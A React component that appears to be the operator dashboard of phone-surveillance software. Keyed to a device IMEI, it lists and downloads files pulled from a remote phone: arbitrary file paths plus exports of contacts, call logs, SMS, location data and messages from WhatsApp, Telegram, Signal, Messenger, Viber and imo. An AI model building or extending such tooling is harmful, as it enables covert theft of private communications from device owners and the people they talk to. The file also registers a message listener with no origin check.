import React from "react";
import { PuffLoader } from "react-spinners";
import { BottomScrollListener } from "react-bottom-scroll-listener";
import getLocalDate from "utils/getLocalDate";
import {
  cancelFile,
  getDeviceInfoX,
  getInfo,
  downloadFiles,
} from "api/admin/requests";

const FileStatus = ({ imei }) => {
  const [fileAlert, setFileAlert] = React.useState(-1);
  const [files, setFiles] = React.useState([]);
  const [sliceFiles, setSliceFiles] = React.useState([]);
  const [loader, setLoader] = React.useState(false);
  const [loaderd, setLoaderd] = React.useState(false);
  const [loaderds, setLoaderds] = React.useState(false);
  const [accordean, setAccordean] = React.useState(false);
  const [type, setType] = React.useState("csv");

  React.useEffect(() => {
    const handler = event => {
      const data = JSON.parse(event.data)
      console.log("Hello World?", data)
      getRefreshedFiles()
      // alert(data)
    }

    window.addEventListener("message", handler)

    // clean up
    return () => window.removeEventListener("message", handler)
  }, [])
  
  React.useEffect(() => {
    getInfo({ imei, skip: 0 }, (data) => {
      setFiles(data.files);
      setSliceFiles(data.files.slice(0, 9));
    });
  }, [imei, getInfo]);

  const cancelGetFile = (path) => {
    cancelFile({ imei, path }, (status) => {
      getDeviceInfoX({ imei });
    });
  };

  const getRefreshedFiles = () => {
    setLoader(true);
    getInfo({ imei, skip: 0 }, (data) => {
      console.log("data refreshed");

      setSliceFiles(data.files.slice(0, 9));
      setFiles(data.files);
      setLoader(false);
    });
  };

  const hover = (e, key) => {
    e.preventDefault();
    let fileRow = document.getElementById(`fileStatus_${key}`);

    fileRow.style.backgroundColor =
      fileRow.style.backgroundColor === "aliceblue" ? "white" : "aliceblue";
  };

  const getMoreFiles = () => {
    console.log("get more", sliceFiles.length);
    setSliceFiles(files.slice(0, sliceFiles.length + 10));
  };

  const requestDownloadFiles = () => {
    const allChecked = document.querySelectorAll('[name^="file-st"]:checked');
    let files = [];
    allChecked &&
      allChecked.forEach((v) => {
        files.push(v.id);
      });
    console.log("made request ", files);
    if (files.length < 1) {
      alert("please select at least one file");
      return;
    }

    setLoaderd(true);
    downloadFiles({ imei, files }, (responce) => {
      console.log("responce ", responce);

      if (responce && responce.status === 200) {
        const name = responce.headers?.filename;
        console.log("respoce ", responce, "----", name);
        const path = window.URL.createObjectURL(new Blob([responce.data]));
        const link = document.createElement("a");
        link.href = path;
        link.setAttribute("download", name);
        document.body.appendChild(link);
        link.click();
      } else if (responce && responce.status === 201) {
        alert("Please may not exist !");
      }
      handleUncheck(1);
      handleUncheck(2);
      setLoaderd(false);
    });
  };

  const handleUncheck = (id) => {
    if (id == 1) {
      const allChecked = document.querySelectorAll('[name^="file-st"]:checked');
      allChecked &&
        allChecked.forEach((v) => {
          v.checked = false;
        });
    }
    if (id == 2) {
      const allChecked = document.querySelectorAll(
        '[name^="static-f"]:checked'
      );
      allChecked &&
        allChecked.forEach((v) => {
          v.checked = false;
        });
    }
  };

  const requestStaticDownloadFiles = () => {
    const allChecked = document.querySelectorAll('[name^="static-f"]:checked');
    let files = [];
    allChecked &&
      allChecked.forEach((v) => {
        files.push(v.id);
      });
    console.log("made request ", files);
    if (files.length < 1) {
      alert("please select at least one file");
      return;
    }

    setLoaderds(true);
    downloadFiles(
      { imei, files, type: "." + type, static: true },
      (responce) => {
        console.log("responce ", responce);
        if (responce && responce.status === 200) {
          const name = responce.headers?.filename;
          console.log("respoce ", responce, "----", name);
          const path = window.URL.createObjectURL(new Blob([responce.data]));
          const link = document.createElement("a");
          link.href = path;
          link.setAttribute("download", name);
          document.body.appendChild(link);
          link.click();
        } else if (responce && responce.status === 201) {
          alert("Please may not exist Or server error!");
        }
        handleUncheck(1);
        handleUncheck(2);
        setLoaderds(false);
      }
    );
  };

  return (
    <>
      <div
        style={{
          width: 300,
          float: "right;",
          display: "flex",
          marginLeft: 20,
          position: "absolute",
          right: 1,
          top: 18,
        }}
      >
        <button
          style={{ background: "#449363 none repeat scroll 0% 0%", width: 120 }}
          className="flex justify-center items-center text-xs font-bold uppercase px-6 py-3 shadow-lg rounded block leading-normal   text-white font-bold uppercase text-sm px-6 py-3 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
          onClick={() => requestDownloadFiles()}
        >
          Download {loaderd ? <PuffLoader size={20} /> : <></>}{" "}
        </button>
        {/* <button
          style={{ background: "#449363 none repeat scroll 0% 0%", width: 190 }}
          className="flex justify-center items-center text-xs font-bold uppercase px-6 py-3 shadow-lg rounded block leading-normal   text-white font-bold uppercase text-sm px-6 py-3 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
          onClick={() => requestStaticDownloadFiles()}
        >Download(html/csv) {loaderds ? <PuffLoader size={20} /> : <></>} </button> */}

        <button
          style={{ background: "#7d43d2", width: 120 }}
          className="flex justify-center items-center text-xs font-bold uppercase px-6 py-3 shadow-lg rounded block leading-normal   text-white font-bold uppercase text-sm px-6 py-3 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
          onClick={() => getRefreshedFiles()}
        >
          Refresh {loader ? <PuffLoader size={20} /> : <></>}{" "}
        </button>
      </div>

      <div style={{ marginLeft: 32 }}>
        {/* <ul>
          <li>CSV <input type="radio" name="fileType" onClick={() => setType("csv")} /> HTML <input type="radio" name="fileType" onClick={() => setType("html")} disabled /></li>
          <li onClick={() => { setAccordean(!accordean); handleUncheck(1) }} style={{ cursor: "pointer" }}><h3>Open List   {accordean ? <i class="fas fa-chevron-down"></i> : <i class="fas fa-chevron-up"></i>}</h3></li>
          <ul style={{ display: accordean ? "block" : "none" }}>
            {["liveInfos", "contacts", "callLogs", "smsLogs", "whatsapp", "telegram", "signal", "messenger", "viber", "conion", "imo", "protectedText"].map(v => {
              return <li><input type="checkbox" id={v} name="static-f" /> {v}</li>
            })}

          </ul>
        </ul> */}
      </div>

      <BottomScrollListener onBottom={getMoreFiles}>
        {(scrollRef) => (
          <div
            style={{ height: 535, margin: "30px", overflowY: "scroll" }}
            ref={scrollRef}
          >
            <table className="items-center w-full bg-transparent border-collapse">
              <thead>
                <tr>
                  <th
                    className={
                      "px-6 align-middle border border-solid py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left g-blueGray-50 text-blueGray-500 border-blueGray-100"
                    }
                  >
                    Check
                  </th>
                  <th
                    className={
                      "px-6 align-middle border border-solid py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left g-blueGray-50 text-blueGray-500 border-blueGray-100"
                    }
                  >
                    Date Requested
                  </th>
                  <th
                    className={
                      "px-6 align-middle border border-solid py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left g-blueGray-50 text-blueGray-500 border-blueGray-100"
                    }
                  >
                    File Name
                  </th>
                  <th
                    className={
                      "px-6 align-middle border border-solid py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left g-blueGray-50 text-blueGray-500 border-blueGray-100"
                    }
                  >
                    Status
                  </th>
                  <th
                    className={
                      "px-6 align-middle border border-solid py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left g-blueGray-50 text-blueGray-500 border-blueGray-100"
                    }
                  ></th>
                </tr>
              </thead>
              <tbody>
                {/** static row  */}
                <tr
                  onClick={() => {
                    setAccordean(!accordean);
                    handleUncheck(1);
                  }}
                  style={{ cursor: "pointer" }}
                  style={{ background: "#83848426", cursor: "pointer" }}
                >
                  <td className="px-6 align-middle border border-solid py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left g-blueGray-50 text-blueGray-500 border-blueGray-100">
                    <span className={"w-full"}>
                      {!accordean ? (
                        <i
                          class="fas fa-caret-right"
                          style={{ fontSize: 26 }}
                        ></i>
                      ) : (
                        <i
                          class="fas fa-caret-down"
                          style={{ fontSize: 26 }}
                        ></i>
                      )}
                    </span>
                  </td>
                  <td className="h-0">
                    <div className="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 flex flex-col justify-center h-full">
                      <span className={"w-full"}> </span>
                    </div>
                  </td>
                  <td className="h-0">
                    <div className="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 flex flex-col justify-center h-full">
                      <p
                        className="truncate"
                        style={{
                          width: 200,
                          overflow: "clip",
                          textOverflow: "ellipsis",
                        }}
                      >
                        {" "}
                        Static Files{" "}
                      </p>
                    </div>{" "}
                  </td>
                  <td className="h-0">
                    {" "}
                    <div className="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 flex flex-col justify-center h-full">
                      <span className={"w-full"}> </span>
                    </div>
                  </td>
                  <td className="h-0"></td>
                </tr>
                {/**end */}

                {[
                  "liveInfos.csv",
                  "contacts.csv",
                  "callLogs.csv",
                  "smsLogs.csv",
                  "whatsapp.csv",
                  "telegram.csv",
                  "signal.csv",
                  "messenger.csv",
                  "viber.csv",
                  "conion.csv",
                  "imo.csv",
                  "protectedText.csv",
                ].map((v, i) => {
                  return (
                    <tr
                      id={`fileStatus_${i.toString()}`}
                      key={i}
                      style={{ display: accordean ? "revert" : "none" }}
                      onMouseEnter={(e) => hover(e, i.toString())}
                      onMouseLeave={(e) => hover(e, i.toString())}
                    >
                      <td className="px-6 align-middle border border-solid py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left g-blueGray-50 text-blueGray-500 border-blueGray-100">
                        <input type="checkbox" id={v} name="file-st" />
                      </td>
                      <td className="h-0">
                        <div className="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 flex flex-col justify-center h-full">
                          {/* <span className={"w-full"}> N/A</span> */}
                        </div>
                      </td>
                      <td className="h-0">
                        <div className="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 flex flex-col justify-center h-full">
                          <p
                            className="truncate"
                            style={{
                              width: 200,
                              overflow: "clip",
                              textOverflow: "ellipsis",
                            }}
                            title={v}
                          >
                            {" "}
                            {v}
                          </p>
                        </div>{" "}
                      </td>
                      <td className="h-0">
                        {" "}
                        <div className="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 flex flex-col justify-center h-full">
                          {/* <span className={"w-full"}> N/A</span> */}
                        </div>
                      </td>
                      <td></td>
                    </tr>
                  );
                })}

                {sliceFiles &&
                  sliceFiles.length > 0 &&
                  sliceFiles.map((file, i) => {
                    return (
                      <tr
                        id={`fileStatus_${(i + 13).toString()}`}
                        key={i + 13}
                        onMouseEnter={(e) => hover(e, (i + 13).toString())}
                        onMouseLeave={(e) => hover(e, (i + 13).toString())}
                      >
                        <td className="px-6 align-middle border border-solid py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left g-blueGray-50 text-blueGray-500 border-blueGray-100">
                          <input
                            type="checkbox"
                            id={file.path.split("/").pop()}
                            name="file-st"
                          />
                        </td>
                        <td className="h-0">
                          <div className="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 flex flex-col justify-center h-full">
                            <span className={"w-full"}>
                              {getLocalDate(file.date)}
                            </span>
                          </div>
                        </td>
                        <td className="h-0">
                          <div className="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 flex flex-col justify-center h-full">
                            <p
                              className="truncate"
                              style={{
                                width: 200,
                                overflow: "clip",
                                textOverflow: "ellipsis",
                              }}
                              title={file.path}
                            >
                              {file.path}
                            </p>
                          </div>
                        </td>
                        <td className="h-0">
                          <div className="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 flex flex-col justify-center h-full">
                            <span
                              className={"w-full"}
                              style={{ color: file.status ? "green" : "red" }}
                            >
                              {file.status ? "Completed" : "Pending"}
                            </span>
                          </div>
                        </td>
                        <td className="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 text-right">
                          <>
                            {fileAlert === i ? (
                              <>
                                <div
                                  style={{
                                    top: "0px",
                                    right: "0px",
                                    bottom: "0px",
                                    left: "0px",
                                    backgroundColor: "#0000005e",
                                  }}
                                  className="justify-center items-center flex overflow-x-hidden overflow-y-auto fixed z-50 outline-none focus:outline-none"
                                  onClick={() => setFileAlert(-1)}
                                >
                                  <div
                                    className="relative w-auto my-6 mx-auto max-w-sm"
                                    style={{ maxWidth: "80%" }}
                                  >
                                    {/*content*/}
                                    <div className="border-0 rounded-lg shadow-lg relative flex flex-col w-full bg-white outline-none focus:outline-none">
                                      {/*header*/}
                                      <div className="flex items-start justify-between p-5 border-b border-solid border-blueGray-200 rounded-t">
                                        <h3 className="text-3xl font-semibold">
                                          Confirmation
                                        </h3>
                                        <button
                                          className="p-1 ml-auto bg-transparent border-0 text-black opacity-5 float-right text-3xl leading-none font-semibold outline-none focus:outline-none"
                                          onClick={() => setFileAlert(-1)}
                                        >
                                          <span className="bg-transparent text-black opacity-5 h-6 w-6 text-2xl block outline-none focus:outline-none">
                                            ×
                                          </span>
                                        </button>
                                      </div>
                                      {/*body*/}
                                      <div
                                        className="relative p-6 flex-auto"
                                        style={{ padding: "20px" }}
                                      >
                                        <p className="my-4 text-blueGray-500 text-lg leading-relaxed">
                                          Are you sure you want to cancel{" "}
                                          <span style={{ fontWeight: "bold" }}>
                                            {file.path}
                                          </span>
                                          ?
                                        </p>
                                      </div>
                                      {/*footer*/}
                                      <div
                                        className="flex items-center justify-end p-6 border-t border-solid border-blueGray-200 rounded-b"
                                        style={{ padding: "20px" }}
                                      >
                                        <button
                                          className="text-red-500 background-transparent font-bold uppercase px-6 py-2 text-sm outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
                                          type="button"
                                          onClick={() => setFileAlert(-1)}
                                        >
                                          Cancel
                                        </button>
                                        <button
                                          className="bg-emerald-500 text-white active:bg-emerald-600 font-bold uppercase text-sm px-6 py-3 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
                                          type="button"
                                          onClick={() =>
                                            cancelGetFile(file.path)
                                          }
                                        >
                                          Cancel File
                                        </button>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                                <div className="opacity-25 fixed inset-0 z-40 bg-black"></div>
                              </>
                            ) : (
                              ""
                            )}
                          </>
                          <button
                            className="bg-red-500 text-white active:bg-red-600 font-bold uppercase text-xs px-4 py-2 rounded shadow hover:shadow-md outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
                            //   onClick={() => cancelGetFile(file.path)}
                            onClick={() => setFileAlert(i)}
                            type="button"
                          >
                            CANCEL
                          </button>
                        </td>
                      </tr>
                    );
                  })}
              </tbody>
            </table>
          </div>
        )}
      </BottomScrollListener>
    </>
  );
};

export default FileStatus;
